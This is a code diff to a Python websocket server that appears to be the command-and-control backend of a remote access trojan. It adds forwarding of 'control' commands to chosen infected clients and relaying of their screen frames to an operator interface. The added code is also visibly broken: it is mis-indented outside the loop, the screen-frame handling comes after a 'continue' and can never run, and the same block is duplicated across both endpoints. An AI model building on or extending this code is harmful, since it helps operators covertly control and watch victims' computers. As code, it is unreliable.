@@ -65,6 +65,18 @@ async def websocket_endpoint(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_json()
+        # Forward control events to client
+        if data.get('action') == 'control':
+            target = data.get('client_id')
+            if target in RAT_CLIENTS:
+                await RAT_CLIENTS[target].send_json(data)
+            continue
+
+            # Handle screen frame
+            if data.get('action') == 'screen_frame':
+                await send_to_web_ui({'action':'screen_frame','client_id': client_id,'data': data.get('data')})
+                continue
+
             action = data.get("action")
             target_id = data.get("target_id")
             if not target_id or target_id not in RAT_CLIENTS:
@@ -168,6 +180,18 @@ async def rat_client_endpoint(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_json()
+        # Forward control events to client
+        if data.get('action') == 'control':
+            target = data.get('client_id')
+            if target in RAT_CLIENTS:
+                await RAT_CLIENTS[target].send_json(data)
+            continue
+
+            # Handle screen frame
+            if data.get('action') == 'screen_frame':
+                await send_to_web_ui({'action':'screen_frame','client_id': client_id,'data': data.get('data')})
+                continue
+
             data["client_id"] = client_id
             await send_to_web_ui(data)
     except WebSocketDisconnect:
